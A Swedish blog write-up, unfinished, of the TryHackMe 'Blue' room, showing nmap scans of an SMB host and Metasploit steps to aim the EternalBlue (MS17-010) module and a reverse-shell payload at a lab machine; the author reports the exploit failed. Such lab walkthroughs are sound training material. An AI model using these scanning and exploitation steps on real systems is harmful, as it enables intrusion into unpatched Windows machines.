---
title: "THM Blue Writeup"
date: 2023-10-01
tags: [writeup, ctf, tryhackme]
description: "Skannar en exponerad SMB-tjänst och använder MS17-010 EternalBlue-exploiten för att få fotfäste i TryHackMes Blue-rum."
---

## Setup

För att påbörja den här utmaningen behöver vi först ansluta till TryHackMes VPN-server. Du kan få mer information om detta på [Access](https://tryhackme.com/access)-sidan.

Jag kommer att använda openvpn för att ansluta till servern. Här är kommandot:

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Enumeration

När maskinen är startad sätter vi igång med att skanna nätverket: 

```console
$ sudo nmap -sS -vv MACHINE_IP
...
Initiating SYN Stealth Scan at 15:45
Scanning MACHINE_IP [1000 ports]
Discovered open port 135/tcp on MACHINE_IP
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP
...
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

Så från den här enkla skanningen får vi svaret på den första frågan i rummet:

> How many ports are open with a port number under 1000?
> > 3

Vi kan undersöka tjänsteversionerna närmare genom att köra en tjänsteskanning på portarna `135`, `139` och `445`:

```console
$ nmap -sV -vv -p135,139,445 MACHINE_IP 
...

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

Inget intressant... Nåja, svaret på nästa fråga blir exploit-koden som motsvarar `Eternal Blue`-exploiten. Hur kom jag fram till det? Ärligt talat syns det ganska tydligt över hela sidan när man kollar på rummet på Tryhackme: 

![](/assets/img/writeup_assets/blue/blue-room-top.png)

En snabb och enkel sökning ger oss exploitens alternativa namn:

![](/assets/img/writeup_assets/blue/eblue-search.png)

Därmed får vi svaret på nästa fråga:

> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
> > MS17-010

## Gaining Access

Beväpnade med kunskapen vi fick från enumereringsfasen testar vi att exploita maskinen vi fått.

Nu finns det två sätt att göra detta på, med metasploit och utan. Vi testar att göra det med metasploit, men jag ska försöka lägga till ett avsnitt där jag provar utan metasploit också.

När vi har dragit igång `msfconsole` kan vi söka efter tillgängliga exploits:

```console
$ sudo msfconsole -q
msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Den vi letar efter är den första, `exploit/windows/smb/ms17_010_eternalblue`. Så där har vi svaret på den första frågan i det här avsnittet:

> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
> > exploit/windows/smb/ms17_010_eternalblue

Vi kan ta en titt på alternativen för modulen vi har valt så här:

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.80.0.96       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Vi behöver sätta några av dessa, där den första och viktigaste är `RHOSTS`:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  MACHINE_IP 
RHOSTS => MACHINE_IP
```

Det är svaret på den andra frågan:

> Show options and set the one required value. What is the name of this value? (All caps for submission)
> > RHOSTS

Härnäst sätter vi payloaden för exploiten, jag använder `windows/x64/shell/reverse_tcp` enligt instruktionerna i rummet:

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```


Och nu kör vi bara exploiten och ser magin hända!
> Observera att om detta inte fungerar är det bara att starta om den virtuella maskinen genom att avsluta den och starta den igen, och sedan köra exploiten efter att ha uppdaterat RHOSTS

```console
```

#### Tja, exploiten fungerar inte alls för mig, så jag uppdaterar denna writeup när den gör det. Ha det fint!


Länk till rummet: https://tryhackme.com/room/blue

